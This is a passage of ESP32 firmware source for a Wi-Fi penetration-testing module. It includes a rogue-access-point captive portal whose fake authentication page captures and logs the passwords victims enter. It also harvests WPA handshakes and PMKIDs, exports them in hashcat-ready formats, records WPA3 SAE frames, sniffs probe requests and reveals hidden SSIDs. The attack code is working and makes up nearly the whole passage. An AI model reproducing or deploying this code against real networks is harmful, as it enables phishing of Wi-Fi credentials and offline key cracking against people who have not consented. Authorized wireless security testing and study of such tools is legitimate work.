    _logEvent("Rogue AP stopped, mgmt AP restored");
}

// ── Captive Portal ────────────────────────────────────────────
void WifiPenModule::_captiveStart() {
    if (_captiveActive) return;
    memset(_captivePassword, 0, sizeof(_captivePassword));
    _captiveServer = new AsyncWebServer(_captivePort);
    if (!_captiveServer) return;

    static const char CAPTIVE_HTML[] =
        "<!DOCTYPE html><html><head><title>WiFi</title></head><body>"
        "<h2>WiFi Authentication Required</h2>"
        "<form method='POST' action='/'>"
        "<label>Password: <input type='password' name='password'></label><br><br>"
        "<input type='submit' value='Connect'>"
        "</form></body></html>";

    _captiveServer->on("/", HTTP_GET, [](AsyncWebServerRequest* req) {
        req->send(200, "text/html", CAPTIVE_HTML);
    });

    // Capture password on POST
    _captiveServer->on("/", HTTP_POST,
        [](AsyncWebServerRequest* req) {},
        nullptr,
        [this](AsyncWebServerRequest* req, uint8_t* data, size_t len, size_t index, size_t total) {
            // Parse form body for "password=" field
            String body((char*)data, len);
            int pos = body.indexOf("password=");
            if (pos >= 0) {
                String pw = body.substring(pos + 9);
                // URL-decode simple cases
                pw.replace("+", " ");
                int amp = pw.indexOf('&');
                if (amp >= 0) pw = pw.substring(0, amp);
                strncpy(_captivePassword, pw.c_str(), 63);
                _captivePassword[63] = '\0';
                _logEvent("CAPTIVE CAPTURED: %s", _captivePassword);
            }
            req->send(200, "text/html",
                "<html><body><h2>Connecting...</h2></body></html>");
        }
    );

    _captiveServer->begin();
    _captiveActive = true;
    _logEvent("Captive portal started on port %u", _captivePort);
}

void WifiPenModule::_captiveStop() {
    if (!_captiveActive || !_captiveServer) return;
    _captiveServer->end();
    delete _captiveServer;
    _captiveServer  = nullptr;
    _captiveActive  = false;
    _logEvent("Captive portal stopped");
}

String WifiPenModule::captivePassword() const {
    return String(_captivePassword);
}

// ── Channel hopper ────────────────────────────────────────────
void WifiPenModule::setHop(bool en) {
    en ? _hopStart() : _hopStop();
}

void WifiPenModule::_hopStart() {
    if (_hopActive) return;
    const esp_timer_create_args_t args = {
        .callback = &_cbHop,
        .arg      = this,
        .name     = "wpen_hop"
    };
    esp_timer_create(&args, &_hopTimer);
    esp_timer_start_periodic(_hopTimer, 500000UL);
    _hopActive = true;
    _logEvent("Channel hopper ON");
}

void WifiPenModule::_hopStop() {
    if (!_hopActive || !_hopTimer) return;
    esp_timer_stop(_hopTimer);
    esp_timer_delete(_hopTimer);
    _hopTimer  = nullptr;
    _hopActive = false;
    _logEvent("Channel hopper OFF");
}

// ── EAPOL replay dedup ────────────────────────────────────────
bool WifiPenModule::_replaySeenAndStore(const uint8_t rc[8]) {
    for (uint8_t i = 0; i < 8; i++) {
        if (memcmp(_replayRing[i], rc, 8) == 0)
            return true;
    }
    memcpy(_replayRing[_replayRingIdx], rc, 8);
    _replayRingIdx = (_replayRingIdx + 1) % 8;
    return false;
}

// ── Frame RX dispatch ─────────────────────────────────────────
void WifiPenModule::_rxFrame(void* buf, wifi_promiscuous_pkt_type_t type) {
    auto* p = (const wifi_promiscuous_pkt_t*)buf;

    if (type == WIFI_PKT_MGMT) {
        _handleMgmtFrame(p);
        return;
    }

    // DATA frames: only process if BSSID matches target
    if (!_isBssidMatch(p)) return;

    // Feature 4: increment frame count
    _frameCount++;

    // Update RSSI history for matched AP
    uint8_t usedIdx = _multiTarget ? _matchedIdx : _tIdx;
    _rssiPush(usedIdx, (int8_t)p->rx_ctrl.rssi);

    switch (_atype) {
        case WpenAttackType::PMKID:
            _handlePmkidFrame(p);
            break;
        case WpenAttackType::HANDSHAKE:
            _handleHandshakeFrame(p);
            break;
        default:
            break;
    }
}

// ── Management frame handler ──────────────────────────────────
void WifiPenModule::_handleMgmtFrame(const wifi_promiscuous_pkt_t* p) {
    if (p->rx_ctrl.sig_len < (int)sizeof(mac_hdr_t)) return;
    auto* mh = (const mac_hdr_t*)p->payload;

    uint8_t subtype = mh->fc.subtype;

    // ── WPS probing (works even when state != RUNNING) ──
    if (_wpsProbing && subtype == 0x08) {
        // Beacon frame — check if from probed BSSID
        if (_wpsProbeIdx < _apCount &&
            memcmp(mh->addr3, _aps[_wpsProbeIdx].bssid, 6) == 0)
        {
            // Parse IEs for WPS (tag 0xDD, OUI 00:50:F2, type 04)
            const uint8_t* body    = p->payload + sizeof(mac_hdr_t);
            int            bodyLen = (int)p->rx_ctrl.sig_len - (int)sizeof(mac_hdr_t);
            // Skip fixed params: 8 timestamp + 2 interval + 2 caps = 12 bytes
            if (bodyLen >= 12) {
                const uint8_t* ies   = body + 12;
                int            ieLen = bodyLen - 12;
                bool found = false;
                while (ieLen >= 2 && !found) {
                    uint8_t tag = ies[0];
                    uint8_t len = ies[1];
                    if (tag == 0xDD && len >= 4) {
                        if (ies[2] == 0x00 && ies[3] == 0x50 &&
                            ies[4] == 0xF2 && ies[5] == 0x04) {
                            found = true;
                        }
                    }
                    if (ieLen < 2 + (int)len) break;
                    ies   += 2 + len;
                    ieLen -= 2 + len;
                }
                _wpsResult = found;
                _wpsDone   = true;
            }
        }
    }

    // Only continue full mgmt processing when running
    if (_state != WpenState::RUNNING) return;

    // ── Probe sniffer mode: capture probe requests ──
    if (_atype == WpenAttackType::PROBE_SNIFFER && subtype == 0x04) {
        const uint8_t* body = p->payload + sizeof(mac_hdr_t);
        int bodyLen = (int)p->rx_ctrl.sig_len - (int)sizeof(mac_hdr_t);
        char ssid[33] = {};
        if (bodyLen >= 2 && body[0] == 0x00) {
            uint8_t sLen = body[1];
            if (sLen > 32) sLen = 32;
            if (bodyLen >= 2 + (int)sLen) {
                memcpy(ssid, body + 2, sLen);
                ssid[sLen] = '\0';
            }
        }
        _addProbe(mh->addr2, ssid, (int8_t)p->rx_ctrl.rssi);
        return;
    }

    // ── Client tracking: Assoc Request (subtype 0x00) / Probe Request (0x04) ──
    if (subtype == 0x00 || subtype == 0x04) {
        bool targetMatch = (_apCount > _tIdx) &&
            (memcmp(mh->addr1, _aps[_tIdx].bssid, 6) == 0 ||
             memcmp(mh->addr3, _aps[_tIdx].bssid, 6) == 0);
        if (targetMatch) {
            _addClient(mh->addr2);
        }
        if (_state == WpenState::RUNNING && !targetMatch) {
            _addClient(mh->addr2);
        }
    }

    // ── Hidden SSID reveal: Probe Response (subtype 0x05) ──
    if (subtype == 0x05 && _apCount > _tIdx && _state == WpenState::RUNNING) {
        if (memcmp(mh->addr3, _aps[_tIdx].bssid, 6) == 0 &&
            _aps[_tIdx].ssid[0] == '\0') {
            const uint8_t* body    = p->payload + sizeof(mac_hdr_t);
            int            bodyLen = (int)p->rx_ctrl.sig_len - (int)sizeof(mac_hdr_t);
            const uint8_t* ies     = body + 12;
            int            ieLen   = bodyLen - 12;
            while (ieLen >= 2) {
                uint8_t tag = ies[0];
                uint8_t len = ies[1];
                if (tag == 0x00) {
                    uint8_t sLen = (len > 32) ? 32 : len;
                    if (ieLen >= 2 + (int)sLen) {
                        memcpy(_aps[_tIdx].ssid, ies + 2, sLen);
                        _aps[_tIdx].ssid[sLen] = '\0';
                        _logEvent("Hidden SSID revealed: '%s'", _aps[_tIdx].ssid);
                    }
                    break;
                }
                if (ieLen < 2 + (int)len) break;
                ies   += 2 + len;
                ieLen -= 2 + len;
            }
        }
    }

    // ── WPA3 SAE Authentication frames (subtype 0x0B) ──
    if (subtype == 0x0B) {
        const uint8_t* body    = p->payload + sizeof(mac_hdr_t);
        int            bodyLen = (int)p->rx_ctrl.sig_len - (int)sizeof(mac_hdr_t);
        if (bodyLen >= 2) {
            uint16_t authAlgo = (uint16_t)body[0] | ((uint16_t)body[1] << 8);
            if (authAlgo == 3) {
                _pcapAppend(p->payload, p->rx_ctrl.sig_len,
                            (uint32_t)(esp_timer_get_time() & 0xFFFFFFFF));
                _saeFrameCount++;
                _logEvent("SAE frame #%u captured", _saeFrameCount);
            }
        }
    }

    // ── Beacon frame processing (subtype 0x08) — target BSSID ──
    if (subtype == 0x08 && _apCount > _tIdx) {
        if (memcmp(mh->addr3, _aps[_tIdx].bssid, 6) == 0) {
            const uint8_t* body    = p->payload + sizeof(mac_hdr_t);
            int            bodyLen = (int)p->rx_ctrl.sig_len - (int)sizeof(mac_hdr_t);

            // Feature 18: extract TSF (8 bytes at start of beacon fixed params)
            if (bodyLen >= 8) {
                uint64_t tsf = 0;
                memcpy(&tsf, body, 8);
                _targetTsf = tsf;
            }

            // Feature 13: parse vendor IEs
            if (bodyLen >= 12) {
                const uint8_t* ies   = body + 12;
                int            ieLen = bodyLen - 12;
                while (ieLen >= 2) {
                    uint8_t tag = ies[0];
                    uint8_t len = ies[1];
                    if (tag == 0xDD && len >= 4) {
                        uint8_t oui0 = ies[2];
                        uint8_t oui1 = ies[3];
                        uint8_t oui2 = ies[4];
                        uint8_t vtype= ies[5];
                        _logEvent("VendorIE OUI=%02x:%02x:%02x type=%02x",
                                  oui0, oui1, oui2, vtype);
                        if (_vendorIECount < 8) {
                            _vendorIEs[_vendorIECount].oui[0] = oui0;
                            _vendorIEs[_vendorIECount].oui[1] = oui1;
                            _vendorIEs[_vendorIECount].oui[2] = oui2;
                            _vendorIEs[_vendorIECount].data_type = vtype;
                            _vendorIECount++;
                        }
                    }
                    if (ieLen < 2 + (int)len) break;
                    ies   += 2 + len;
                    ieLen -= 2 + len;
                }
            }
        }
    }
}

// ── BSSID match ───────────────────────────────────────────────
bool WifiPenModule::_isBssidMatch(const wifi_promiscuous_pkt_t* p) {
    if (p->rx_ctrl.sig_len < (int)sizeof(mac_hdr_t)) return false;
    auto* mh = (const mac_hdr_t*)p->payload;

    if (_multiTarget) {
        for (uint8_t t = 0; t < _targetIdxCount; t++) {
            uint8_t idx = _targetIdxList[t];
            if (idx < _apCount &&
                memcmp(mh->addr3, _aps[idx].bssid, 6) == 0) {
                _matchedIdx = idx;
                return true;
            }
        }
        return false;
    }

    return memcmp(mh->addr3, _aps[_tIdx].bssid, 6) == 0;
}

// ── EAPOL parsing ─────────────────────────────────────────────
// BOUNDS FIX: every offset advance now checks against sig_len. Crafted
// short frames previously read past the captured buffer (1-byte body
// would still index byte+12 to read the EtherType).
eapol_hdr_t* WifiPenModule::_parseEapol(const wifi_promiscuous_pkt_t* p) {
    auto* mh = (const mac_hdr_t*)p->payload;
    if (mh->fc.protected_frame) return nullptr;

    const uint8_t* end = (const uint8_t*)p->payload + p->rx_ctrl.sig_len;
    uint8_t* body = (uint8_t*)p->payload + sizeof(mac_hdr_t);
    if ((const uint8_t*)body > end) return nullptr;
    if (mh->fc.subtype > 7) {
        if (body + 2 > end) return nullptr;
        body += 2;
    }
    if (body + sizeof(llc_snap_t) + 2 > end) return nullptr;
    body += sizeof(llc_snap_t);

    uint16_t et = ntohs(*(uint16_t*)body);
    if (et != 0x888E) return nullptr;
    body += 2;
    if (body + sizeof(eapol_hdr_t) > end) return nullptr;
    return (eapol_hdr_t*)body;
}

eapol_key_t* WifiPenModule::_parseEapolKey(const eapol_hdr_t* eh) {
    if (!eh) return nullptr;
    if (eh->packet_type != EAPOL_KEY_PACKET_TYPE) return nullptr;
    return (eapol_key_t*)((uint8_t*)eh + sizeof(eapol_hdr_t));
}

// ── PMKID parsing ────────────────────────────────────────────
// BOUNDS FIX: the attacker-controlled key_data_length used to be
// trusted without checking it fit within the captured frame; the IE
// walk could then read arbitrary heap past the rx buffer. Caller is
// expected to pass the frame end via _parsePmkidBounded; the plain
// _parsePmkid stub clamps kdLen to a sane upper limit (256) which
// fits inside any reasonable EAPOL key descriptor.
PmkidItem* WifiPenModule::_parsePmkid(const eapol_key_t* ek) {
    if (!ek) return nullptr;
    uint16_t kdLen = ntohs(ek->key_data_length);
    if (kdLen == 0) return nullptr;
    if (kdLen > 1024) kdLen = 1024;   // hard cap — any larger is malformed

    uint16_t ki = ((uint16_t)ek->key_info[0] << 8) | ek->key_info[1];
    if (ki & (1 << 12)) return nullptr;

    const uint8_t* kd    = (const uint8_t*)ek + sizeof(eapol_key_t);
    const uint8_t* kdEnd = kd + kdLen;

    PmkidItem* head = nullptr;
    while (kd + 2 < kdEnd) {
        auto* kde = (const key_data_kde_t*)kd;
        if (kde->type == 0xDD && kde->length >= 4 &&
            kde->oui[0] == 0x00 && kde->oui[1] == 0x0F &&
            kde->oui[2] == 0xAC && kde->data_type == 0x04)
        {
            const uint8_t* pmkData = kd + sizeof(key_data_kde_t);
            if ((ptrdiff_t)(kdEnd - pmkData) >= 16) {
                PmkidItem* item = (PmkidItem*)malloc(sizeof(PmkidItem));
                if (item) {
                    memcpy(item->pmkid, pmkData, 16);
                    item->next = head;
                    head = item;
                    _logEvent("PMKID: %02x%02x%02x%02x...",
                        item->pmkid[0],item->pmkid[1],
                        item->pmkid[2],item->pmkid[3]);
                }
            }
        }
        if (kd + 2 + kde->length > kdEnd) break;
        kd += 2 + kde->length;
    }
    return head;
}

void WifiPenModule::_pmkidFreeList() {
    PmkidItem* cur = _pmkidHead;
    while (cur) { PmkidItem* nx = cur->next; free(cur); cur = nx; }
    _pmkidHead = nullptr;
}

static uint16_t _countPmkids(const PmkidItem* head) {
    uint16_t n = 0;
    for (const PmkidItem* c = head; c; c = c->next) n++;
    return n;
}

// ── Handshake handler ─────────────────────────────────────────
void WifiPenModule::_handleHandshakeFrame(const wifi_promiscuous_pkt_t* p) {
    eapol_hdr_t* eh  = _parseEapol(p);
    eapol_key_t* ek  = _parseEapolKey(eh);
    if (!ek) return;

    if (_replaySeenAndStore(ek->replay_counter)) {
        _logEvent("EAPOL replay duplicate — skipped");
        return;
    }

    _pcapAppend(p->payload, p->rx_ctrl.sig_len,
                (uint32_t)(esp_timer_get_time() & 0xFFFFFFFF));

    _hccapxAddFrame(p);
    _logEvent("EAPOL-Key captured");

    if (_hccapx.message_pair != 255) {
        _logEvent("Handshake pair %u complete", _hccapx.message_pair);
        // Feature 29: auto-save PCAP on handshake complete
        if (_autoSavePcap && sdMgr.isAvailable()) {
            char path[64];
            snprintf(path, sizeof(path), "/wpen/handshake_%lu.pcap", (unsigned long)millis());
            savePcapToSd(path);
        }
        stopAttack();
        _state = WpenState::FINISHED;
    }
}

// ── PMKID handler (with dedup) ────────────────────────────────
void WifiPenModule::_handlePmkidFrame(const wifi_promiscuous_pkt_t* p) {
    eapol_hdr_t* eh = _parseEapol(p);
    eapol_key_t* ek = _parseEapolKey(eh);
    if (!ek) return;

    // FLOOD FIX: cap the PMKID list. Attacker can flood EAPOL frames
    // with unique PMKIDs; without a cap _pmkidHead grows unbounded
    // (24 bytes per entry) until malloc fails and the chip stops
    // responding.
    static const uint16_t MAX_PMKIDS = 64;
    if (_countPmkids(_pmkidHead) >= MAX_PMKIDS) return;

    PmkidItem* found = _parsePmkid(ek);
    if (!found) return;

    // Feature 1: PMKID dedup — filter out duplicates before appending
    PmkidItem* cur = found;
    PmkidItem* prev = nullptr;
    while (cur) {
        PmkidItem* next = cur->next;
        // Check if this PMKID already exists in _pmkidHead
        bool isDup = false;
        for (PmkidItem* ex = _pmkidHead; ex; ex = ex->next) {
            if (memcmp(ex->pmkid, cur->pmkid, 16) == 0) {
                isDup = true;
                break;
            }
        }
        if (isDup) {
            // Remove from found list
            if (prev) {
                prev->next = next;
            } else {
                found = next;
            }
            free(cur);
        } else {
            prev = cur;
        }
        cur = next;
    }

    if (!found) return;  // all were duplicates

    // Append non-duplicate items to existing list
    PmkidItem* tail = found;
    while (tail->next) tail = tail->next;
    tail->next = _pmkidHead;
    _pmkidHead = found;

    _pcapAppend(p->payload, p->rx_ctrl.sig_len,
                (uint32_t)(esp_timer_get_time() & 0xFFFFFFFF));

    _logEvent("PMKID collected (total=%u)", _countPmkids(_pmkidHead));

    // Feature 30: auto-save PMKID on capture
    if (_autoSavePmkid && sdMgr.isAvailable()) {
        saveHcx22000ToSD();
        savePmkidToSD();
    }
}

// ── PCAP serializer ───────────────────────────────────────────
void WifiPenModule::_pcapInit() {
    _pcapFree();
    pcap_global_hdr_t gh;
    _pcap = (uint8_t*)malloc(sizeof(gh));
    if (!_pcap) return;
    memcpy(_pcap, &gh, sizeof(gh));
    _pcapSz = sizeof(gh);
}

void WifiPenModule::_pcapAppend(const uint8_t* buf, size_t len, uint32_t ts_us) {
    if (!buf || len == 0 || _pcapSz + sizeof(pcap_rec_hdr_t) + len > PCAP_MAX) return;
    pcap_rec_hdr_t rh = {
        .ts_sec  = ts_us / 1000000U,
        .ts_usec = ts_us % 1000000U,
        .incl_len= (uint32_t)len,
        .orig_len= (uint32_t)len
    };
    uint8_t* tmp = (uint8_t*)realloc(_pcap, _pcapSz + sizeof(rh) + len);
    if (!tmp) { _logEvent("PCAP realloc failed"); return; }
    _pcap = tmp;
    memcpy(_pcap + _pcapSz, &rh, sizeof(rh));
    memcpy(_pcap + _pcapSz + sizeof(rh), buf, len);
    _pcapSz += sizeof(rh) + len;
}

void WifiPenModule::_pcapFree() {
    if (_pcap) { free(_pcap); _pcap = nullptr; }
    _pcapSz = 0;
}

// ── Save PCAP to SD ───────────────────────────────────────────
bool WifiPenModule::savePcapToSd(const char* path) {
    if (!_pcap || _pcapSz == 0) {
        _logEvent("savePcapToSd: no pcap data");
        return false;
    }
    if (!sdMgr.isAvailable()) {
        _logEvent("savePcapToSd: SD not mounted");
        return false;
    }
    String spath(path);
    int slash = spath.lastIndexOf('/');
    if (slash > 0) {
        sdMgr.makeDir(spath.substring(0, slash));
    }
    if (!sdMgr.beginUpload(spath)) {
        _logEvent("savePcapToSd: beginUpload failed");
        return false;
    }
    if (!sdMgr.writeUploadChunk(_pcap, _pcapSz)) {
        sdMgr.abortUpload();
        _logEvent("savePcapToSd: write failed");
        return false;
    }
    sdMgr.endUpload();
    _logEvent("PCAP saved to SD: %s (%u bytes)", path, (unsigned)_pcapSz);
    return true;
}

// ── HCCAPX serializer ─────────────────────────────────────────
void WifiPenModule::_hccapxInit(const char* ssid, uint8_t ssidLen) {
    memset(&_hccapx, 0, sizeof(_hccapx));
    _hccapx.signature    = 0x58504348;
    _hccapx.version      = 4;
    _hccapx.message_pair = 255;
    _hccapx.keyver       = 2;
    _hccapx.essid_len    = ssidLen;
    memcpy(_hccapx.essid, ssid, ssidLen);
    _msgAP = _msgSTA = _eapolSrc = 0;
}

bool WifiPenModule::_hccapxArrayZero(const uint8_t* a, unsigned sz) {
    for (unsigned i = 0; i < sz; i++) if (a[i]) return false;
    return true;
}

int WifiPenModule::_hccapxSaveEapol(const eapol_hdr_t* eh, const eapol_key_t* ek) {
    uint16_t eLen = sizeof(eapol_hdr_t) + ntohs(eh->packet_body_len);
    if (eLen > 256) { _logEvent("EAPOL too long"); return 1; }
    _hccapx.eapol_len = eLen;
    memcpy(_hccapx.eapol, eh, eLen);
    memcpy(_hccapx.keymic, ek->key_mic, 16);
    if (eLen > 81 + 16) memset(_hccapx.eapol + 81, 0, 16);
    return 0;
}

void WifiPenModule::_hccapxAddFrame(const wifi_promiscuous_pkt_t* p) {
    auto* mh = (const mac_hdr_t*)p->payload;
    eapol_hdr_t* eh = _parseEapol(p);
    eapol_key_t* ek = _parseEapolKey(eh);
    if (!eh || !ek) return;

    bool fromAP  = (memcmp(mh->addr2, mh->addr3, 6) == 0);
    bool fromSTA = (memcmp(mh->addr1, mh->addr3, 6) == 0);

    if (fromAP) {
        if (!_hccapxArrayZero(_hccapx.mac_sta, 6) &&
            memcmp(mh->addr1, _hccapx.mac_sta, 6) != 0) return;

        if (_msgAP == 0) memcpy(_hccapx.mac_ap, mh->addr2, 6);

        if (_hccapxArrayZero(ek->key_mic, 16)) {
            _msgAP = 1;
            memcpy(_hccapx.nonce_ap, ek->key_nonce, 32);
        } else {
            _msgAP = 3;
            if (_msgAP == 0) memcpy(_hccapx.nonce_ap, ek->key_nonce, 32);
            if (_eapolSrc == 2) { _hccapx.message_pair = 2; return; }
            if (_hccapxSaveEapol(eh, ek)) return;
            _eapolSrc = 3;
            if (_msgSTA == 2) _hccapx.message_pair = 3;
        }
    } else if (fromSTA) {
        if (_hccapxArrayZero(_hccapx.mac_sta, 6))
            memcpy(_hccapx.mac_sta, mh->addr2, 6);
        else if (memcmp(mh->addr2, _hccapx.mac_sta, 6) != 0) return;

        if (!_hccapxArrayZero(ek->key_nonce, 16)) {
            _msgSTA = 2;
            memcpy(_hccapx.nonce_sta, ek->key_nonce, 32);
            if (_hccapxSaveEapol(eh, ek)) return;
            _eapolSrc = 2;
            if (_msgAP == 1) _hccapx.message_pair = 0;
        } else {
            if (_msgSTA == 2 && _eapolSrc) return;
            if (_msgAP == 0) return;
            if (_eapolSrc == 3) { _hccapx.message_pair = 4; return; }
            if (_hccapxSaveEapol(eh, ek)) return;
            _eapolSrc = 4;
            if (_msgAP == 1) _hccapx.message_pair = 1;
            if (_msgAP == 3) _hccapx.message_pair = 5;
        }
    }
}

// ── PMKID hashcat format ──────────────────────────────────────
String WifiPenModule::pmkidHashcat() const {
    if (!_pmkidHead) return "";
    uint8_t staMac[6] = {};
    esp_wifi_get_mac(WIFI_IF_STA, staMac);

    auto toHex = [](const uint8_t* b, int n) -> String {
        String s;
        for (int i = 0; i < n; i++) {
            char h[3]; snprintf(h, 3, "%02x", b[i]); s += h;
        }
        return s;
    };

    String ssidHex = toHex((const uint8_t*)_aps[_tIdx].ssid,
                           strlen(_aps[_tIdx].ssid));
    String bssidHex= toHex(_aps[_tIdx].bssid, 6);
    String staHex  = toHex(staMac, 6);

    String out;
    for (PmkidItem* cur = _pmkidHead; cur; cur = cur->next) {
        if (out.length()) out += "\n";
        out += toHex(cur->pmkid, 16) + "*" + bssidHex + "*" + staHex + "*" + ssidHex;
    }
    return out;
}

// ── hcxtools .22000 format ────────────────────────────────────
// Format: WPA*02*<PMKID_HEX>*<BSSID_HEX_NOCOLON>*<STA_HEX_NOCOLON>*<SSID_HEX>***
String WifiPenModule::pmkidHcx22000() const {
    if (!_pmkidHead) return "";
    uint8_t staMac[6] = {};
    esp_wifi_get_mac(WIFI_IF_STA, staMac);

    auto toHex = [](const uint8_t* b, int n) -> String {
        String s;
        for (int i = 0; i < n; i++) {
            char h[3]; snprintf(h, 3, "%02x", b[i]); s += h;
        }
        return s;
    };

    String ssidHex  = toHex((const uint8_t*)_aps[_tIdx].ssid,
                            strlen(_aps[_tIdx].ssid));
    String bssidHex = toHex(_aps[_tIdx].bssid, 6);
    String staHex   = toHex(staMac, 6);

    String out;
    for (PmkidItem* cur = _pmkidHead; cur; cur = cur->next) {
        if (out.length()) out += "\n";
        out += "WPA*02*"
             + toHex(cur->pmkid, 16) + "*"
             + bssidHex + "*"
             + staHex   + "*"
             + ssidHex  + "***";
    }
    return out;
}

// ── WPS probe ─────────────────────────────────────────────────
bool WifiPenModule::probeForWps(uint8_t apIdx, uint32_t timeoutMs) {
    if (apIdx >= _apCount) return false;
    if (_state == WpenState::RUNNING) return false;  // don't disturb active attack

    _wpsProbeIdx = apIdx;
    _wpsResult   = false;
    _wpsDone     = false;
    _wpsProbing  = true;

    // Enable promiscuous on AP's channel
    uint8_t ch = _aps[apIdx].channel;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    wifi_promiscuous_filter_t f = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_cbPromiscuous);

    uint32_t start = millis();
    while (!_wpsDone && (millis() - start) < timeoutMs) {
        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    _wpsProbing = false;

    _aps[apIdx].wps = _wpsResult;
    _logEvent("WPS probe ap[%u]: %s", apIdx, _wpsResult ? "WPS found" : "no WPS");
    return _wpsResult;
}

// ── Channel utilization ───────────────────────────────────────
String WifiPenModule::channelUtilJson() const {
    uint8_t counts[14] = {};  // index 1-13
    for (uint8_t i = 0; i < _apCount; i++) {
        uint8_t ch = _aps[i].channel;
        if (ch >= 1 && ch <= 13) counts[ch]++;
    }
    String out = "{";
    bool first = true;
    for (uint8_t ch = 1; ch <= 13; ch++) {
        if (counts[ch] > 0) {
            if (!first) out += ',';
            out += "\"ch" + String(ch) + "\":" + String(counts[ch]);
            first = false;
        }
    }
    return out + "}";
}

// ── Hidden AP fingerprint ─────────────────────────────────────
String WifiPenModule::hiddenApJson() const {
    String out = "[";
    bool first = true;
    for (uint8_t i = 0; i < _apCount; i++) {
        if (_aps[i].ssid[0] != '\0') continue;
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _aps[i].bssid[0],_aps[i].bssid[1],_aps[i].bssid[2],
            _aps[i].bssid[3],_aps[i].bssid[4],_aps[i].bssid[5]);
        const char* oui = ouiLookup(_aps[i].bssid);
        if (!first) out += ',';
        out += "{\"idx\":"    + String(i)
             + ",\"bssid\":\"" + String(b) + "\""
             + ",\"ch\":"     + String(_aps[i].channel)
             + ",\"rssi\":"   + String(_aps[i].rssi)
             + ",\"oui\":\""  + String(oui) + "\""
             + "}";
        first = false;
    }
    return out + "]";
}

// ── Mesh/repeater detection ───────────────────────────────────
String WifiPenModule::meshApJson() const {
    String out = "[";
    bool firstGroup = true;

    for (uint8_t i = 0; i < _apCount; i++) {
        if (_aps[i].ssid[0] == '\0') continue;

        // Check if we already processed this SSID
        bool alreadyProcessed = false;
        for (uint8_t prev = 0; prev < i; prev++) {
            if (strncmp(_aps[prev].ssid, _aps[i].ssid, 32) == 0) {
                alreadyProcessed = true;
                break;
            }
        }
        if (alreadyProcessed) continue;

        // Collect all APs with same SSID
        uint8_t matchList[20];
        uint8_t matchCount = 0;
        for (uint8_t j = i; j < _apCount; j++) {
            if (strncmp(_aps[j].ssid, _aps[i].ssid, 32) == 0) {
                matchList[matchCount++] = j;
            }
        }

        // Only report as mesh if more than one BSSID
        if (matchCount < 2) continue;

        if (!firstGroup) out += ',';
        out += "{\"ssid\":\"" + String(_aps[i].ssid) + "\""
             + ",\"count\":"  + String(matchCount)
             + ",\"bssids\":[";
        for (uint8_t k = 0; k < matchCount; k++) {
            uint8_t idx = matchList[k];
            char b[18];
            snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
                _aps[idx].bssid[0],_aps[idx].bssid[1],_aps[idx].bssid[2],
                _aps[idx].bssid[3],_aps[idx].bssid[4],_aps[idx].bssid[5]);
            if (k) out += ',';
            out += "\"" + String(b) + "\"";
        }
        out += "]}";
        firstGroup = false;
    }
    return out + "]";
}

// ── Vendor IE JSON ────────────────────────────────────────────
String WifiPenModule::vendorIEJson() const {
    String out = "[";
    for (uint8_t i = 0; i < _vendorIECount; i++) {
        if (i) out += ',';
        char ouiStr[9];
        snprintf(ouiStr, sizeof(ouiStr), "%02x:%02x:%02x",
                 _vendorIEs[i].oui[0], _vendorIEs[i].oui[1], _vendorIEs[i].oui[2]);
        char typeStr[3];
        snprintf(typeStr, sizeof(typeStr), "%02x", _vendorIEs[i].data_type);
        out += "{\"oui\":\"" + String(ouiStr) + "\",\"type\":\"" + String(typeStr) + "\"}";
    }
    return out + "]";
}

// ── RSSI history JSON ─────────────────────────────────────────
String WifiPenModule::rssiHistJson(uint8_t apIdx) const {
    String out = "{\"apIdx\":" + String(apIdx) + ",\"samples\":[";
    if (apIdx < 20) {
        const RssiHistory& hist = _rssiHist[apIdx];
        for (uint8_t i = 0; i < hist.len; i++) {
            // Read in order from oldest to newest
            uint8_t slot = (hist.head + 8 - hist.len + i) % 8;
            if (i) out += ',';
            out += String((int)hist.samples[slot]);
        }
    }
    return out + "]}";
}

// ── AP uptime from TSF ────────────────────────────────────────
uint32_t WifiPenModule::targetUptimeSec() const {
    return (uint32_t)(_targetTsf / 1000000ULL);
}

// ── Persist targets to LittleFS ───────────────────────────────
void WifiPenModule::saveTargets() {
    JsonDocument doc;
    JsonArray arr = doc["aps"].to<JsonArray>();
    for (uint8_t i = 0; i < _apCount; i++) {
        JsonObject o = arr.add<JsonObject>();
        o["ssid"]    = _aps[i].ssid;
        char b[18];
        snprintf(b, sizeof(b), "%02x:%02x:%02x:%02x:%02x:%02x",
            _aps[i].bssid[0],_aps[i].bssid[1],_aps[i].bssid[2],
            _aps[i].bssid[3],_aps[i].bssid[4],_aps[i].bssid[5]);
        o["bssid"]   = b;
        o["rssi"]    = _aps[i].rssi;
        o["channel"] = _aps[i].channel;
        o["auth"]    = _aps[i].authmode;
        o["wps"]     = _aps[i].wps;
    }
    File f = LittleFS.open("/wpen/targets.json", "w");
    if (!f) {
        LittleFS.mkdir("/wpen");
        f = LittleFS.open("/wpen/targets.json", "w");
    }
    if (!f) { _logEvent("saveTargets: open failed"); return; }
    serializeJson(doc, f);
    f.close();
    _logEvent("Targets saved (%u APs)", _apCount);

    // Feature 32: dual-write targets to SD
    if (sdMgr.isAvailable()) {
        sdMgr.makeDir("/wpen");
        File sf = sdMgr.openForWrite("/wpen/targets.json");
        if (sf) { serializeJson(doc, sf); sf.close(); }
    }
}

void WifiPenModule::loadTargets() {
    File f = LittleFS.open("/wpen/targets.json", "r");
    // Feature 32: SD fallback if LittleFS file missing
    if (!f && sdMgr.isAvailable()) {
        String sdContent = sdMgr.readTextFile("/wpen/targets.json");
        if (!sdContent.isEmpty()) {
            JsonDocument doc2;
            if (deserializeJson(doc2, sdContent) == DeserializationError::Ok) {
                JsonArray arr2 = doc2["aps"];
                _apCount = 0;
                for (JsonObject o : arr2) {
                    if (_apCount >= 20) break;
                    memset(&_aps[_apCount], 0, sizeof(WpenAP));
                    const char* ssid = o["ssid"] | "";
                    strncpy(_aps[_apCount].ssid, ssid, 32);
                    _aps[_apCount].rssi     = (int8_t)(o["rssi"] | -100);
                    _aps[_apCount].channel  = (uint8_t)(o["channel"] | 1);
                    _aps[_apCount].authmode = (uint8_t)(o["auth"] | 0);
